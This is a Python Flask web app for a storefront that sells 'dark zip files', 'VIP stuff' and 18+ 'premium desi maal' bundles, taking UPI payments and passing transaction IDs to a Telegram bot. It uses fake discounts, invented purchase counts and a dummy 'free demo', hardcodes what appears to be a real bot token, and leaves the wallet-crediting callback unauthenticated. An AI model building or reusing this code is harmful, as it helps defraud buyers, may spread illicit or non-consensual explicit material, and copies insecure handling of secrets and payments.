from flask import Flask, render_template_string, request, jsonify
import os
import requests
import json

app = Flask(__name__)

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8991320152:AAFLJcXRpfQi3P-Wgap0bF8e5wIscG4XxY0"
TELEGRAM_CHAT_ID = "6632236983"

def get_balance():
    if not os.path.exists("wallet.txt"): return "0"
    with open("wallet.txt", "r") as f: return f.read()

def update_wallet(amount):
    bal = int(get_balance())
    with open("wallet.txt", "w") as f: f.write(str(bal + int(amount)))

# --- ORIGINAL CONTENT ---
content = [
    {"text": "😍 <b>80000+ zip file's Channel</b> 💔<br>━━━━━━━━━━━━━━━━━━━━<br><b>Benefits:</b><br>• 📁 All Dark Zip Files Available<br>• 🆕 New Files Added Daily<br>• 🔄 Forwarding Files is Allowed<br><br>🤔 <b>Want to Buy?</b><br>🚀 <i>Offers Are Live Now!</i><br><br>Price: <strike>Rs. 3,999.00</strike> <b>Rs. 99.00</b><br>🔥 <i>174 people bought this</i>", "media": "/static/1.jpg"},
    {"text": "🥷 <b>VIP STUFF AVAILABLE</b> 🇨🇦<br>━━━━━━━━━━━━━━━━━━━━<br>Price: <strike>Rs. 299.00</strike> <b>Rs. 149.00</b><br>🔥 <i>94 people bought this</i>", "media": "/static/2.jpg"},
    {"text": "🔞 <b>PREMIUM DESI MAAL</b> 🍑<br>━━━━━━━━━━━━━━━━━━━━<br>Price: <strike>Rs. 259.00</strike> <b>Rs. 69.00</b><br>🔥 <i>314 people bought this</i>", "media": "/static/3.jpg"}
]

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background:#0b1626; color:#fff; font-family:sans-serif; margin:0; padding-top:70px; }
        .header { position:fixed; top:0; width:100%; background:#15253d; padding:15px; display:flex; justify-content:space-between; z-index:1000; border-bottom:1px solid #007bff; box-sizing:border-box; }
        .card { background:#15253d; border:1px solid #2c3e50; padding:15px; margin:15px auto; width:95%; max-width:400px; border-radius:15px; }
        img { width:100%; border-radius:10px; display:block; }
        .btn-demo { background:#ffc107; color:black; padding:12px; margin-bottom:10px; border-radius:8px; font-weight:bold; text-align:center; cursor:pointer; }
        .buy-btn { width:100%; background:#28a745; color:white; text-align:center; padding:12px; border-radius:8px; font-weight:bold; cursor:pointer; border:none; display:block; }
        .popup { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:2000; justify-content:center; align-items:center; }
        .qr-box { background:white; padding:20px; border-radius:15px; color:black; text-align:center; width:85%; max-width:320px; }
        input { width:100%; padding:10px; margin:5px 0; border:1px solid #ccc; border-radius:5px; box-sizing:border-box; }
    </style>
</head>
<body>
    <div class="header">
        <div onclick="showPayment()" style="cursor:pointer; font-weight:bold;">➕ Add Payment</div>
        <div style="font-weight:bold;">💰 Wallet: ₹{{ balance }}</div>
    </div>
    {% for i in content %}
    <div class="card">
        <img src="{{ i.media }}">
        <p style="margin-top:15px; font-size:15px;">{{ i.text|safe }}</p>
        <div class="btn-demo" onclick="alert('Demo Loading...')">FREE DEMO</div>
        <button class="buy-btn" onclick="showPayment()">BUY NOW</button>
    </div>
    {% endfor %}

    <div id="paymentPopup" class="popup" onclick="this.style.display='none'">
        <div class="qr-box" onclick="event.stopPropagation()">
            <img src="/static/qr.jpg" style="width:100%; border:2px solid #ccc;">
            <input type="text" id="txId" placeholder="Transaction ID (UTR)">
            <input type="number" id="amount" placeholder="Amount Paid">
            <button class="buy-btn" onclick="verifyPayment()">VERIFY PAYMENT</button>
        </div>
    </div>

    <script>
        function showPayment() { document.getElementById('paymentPopup').style.display = 'flex'; }
        function verifyPayment() {
            let tid = document.getElementById('txId').value;
            let amt = document.getElementById('amount').value;
            if(!tid || !amt) { alert("Pehle dono details sahi se fill karo!"); return; }
            fetch('/verify-payment', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({txId:tid, amount:amt}) })
            .then(res=>res.json()).then(data=>{ alert(data.message); if(data.status==='success') document.getElementById('paymentPopup').style.display='none'; });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home(): return render_template_string(HTML, content=content, balance=get_balance())

@app.route('/verify-payment', methods=['POST'])
def verify_payment():
    data = request.json
    tid, amt = data.get('txId'), data.get('amount')
    keyboard = {"inline_keyboard": [[{"text": "✅ VERIFY PAYMENT", "callback_data": f"verify_{amt}_{tid}"}]]}
    msg = f"🔔 *New Order*\n💰 Amt: ₹{amt}\n🆔 ID: `{tid}`"
    requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", 
                  json={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "Markdown", "reply_markup": keyboard})
    return jsonify({"message": "Request Admin ko bhej di gayi hai!", "status": "success"})

@app.route('/telegram-callback', methods=['POST'])
def telegram_callback():
    update = request.json
    if 'callback_query' in update:
        query = update['callback_query']
        if query['data'].startswith("verify_"):
            _, amt, tid = query['data'].split("_")
            update_wallet(amt)
            requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery?callback_query_id={query['id']}&text=Verified! Balance Updated.")
    return "OK"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
